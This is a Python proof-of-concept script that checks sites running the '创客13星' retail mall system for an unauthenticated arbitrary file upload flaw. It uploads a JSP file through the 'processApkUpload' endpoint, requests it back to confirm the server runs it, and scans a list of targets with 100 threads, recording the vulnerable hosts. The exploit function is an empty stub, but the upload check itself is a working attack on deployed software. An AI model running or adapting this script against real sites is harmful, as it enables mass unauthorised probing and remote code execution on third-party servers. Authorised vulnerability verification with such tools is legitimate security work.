import sys
import argparse
import requests
import logging
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|
                               
                               



                            version:1.1.0
                            author:fangwei   


    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="创客13星零售商城系统前台任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/ajaxinvoke/frameworkModuleJob.processApkUpload.upload"
    payload2 = "/apk/67/qwe.jsp"
    headers = {
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,"
                      "likeGecko)Chrome/93.0.4577.63Safari/537.36",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx",
    }
    data = ('------WebKitFormBoundaryFQqYtrIWb8iBxUCx\r\nContent-Disposition: form-data; name="Filedata"; '
            'filename="qwe.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n<% out.print("hello"); '
            '%>\r\n------WebKitFormBoundaryFQqYtrIWb8iBxUCx--')
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    try:
        res1 = requests.post(url = target + payload, data=data, headers=headers, verify=False)
        if res1.status_code == 200 and "url" in res1.text:
            res2 = requests.get(url = target + payload2, headers=headers, verify=False)
            if res2.status_code == 200 and "hello" in res2.text:
                logger.info(f"[+] {target} 存在任意文件上传漏洞")
                with open('processre.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
                    f.close()
                    return True
            else:
                logger.info(f"[-] {target} 不存在任意文件上传漏洞")
    except Exception as e:
        logger.error(f"[-] {target} 连接失败: {e}")
        return False


def exp(target):
    pass


if __name__ == '__main__':
    main()
